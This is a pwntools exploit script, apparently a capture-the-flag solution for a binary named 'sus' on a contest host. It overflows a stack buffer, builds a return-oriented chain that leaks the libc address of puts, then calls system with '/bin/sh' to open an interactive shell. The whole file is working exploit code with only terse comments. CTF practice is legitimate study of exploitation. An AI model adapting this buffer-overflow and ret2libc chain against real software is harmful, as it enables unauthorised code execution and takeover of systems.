#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("sus_patched")
libc = ELF("libc.so.6")

context.binary = exe

host = "chall.lac.tf"
port = 31284

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp 0x00401197
c
'''.format(**locals())

# shortcut lambda
info = lambda msg: log.info(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

io = start()

# good luck pwning :)

payload = b"a"*56 # str56_ucinf_input
payload += p64(exe.got['puts']) # u
payload += b"a"*8 # rbp
payload += p64(exe.plt['puts']) # ret
payload += p64(exe.symbols['sus'] + 10) # ret2
payload += p64(exe.symbols['main']) # ret3

sla(b"sus?\n", payload)
leaked_puts = u64(io.recvline()[:-1].ljust(8, b"\x00"))
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"leaked libc: {hex(libc.address)}")

payload = b"a"*56 # str56_ucinf_input
payload += p64(next(libc.search(b"/bin/sh\00"))) # u
payload += b"a"*8 # rbp
payload += p64(libc.symbols['system']) # ret

sla(b"sus?\n", payload)

io.interactive()

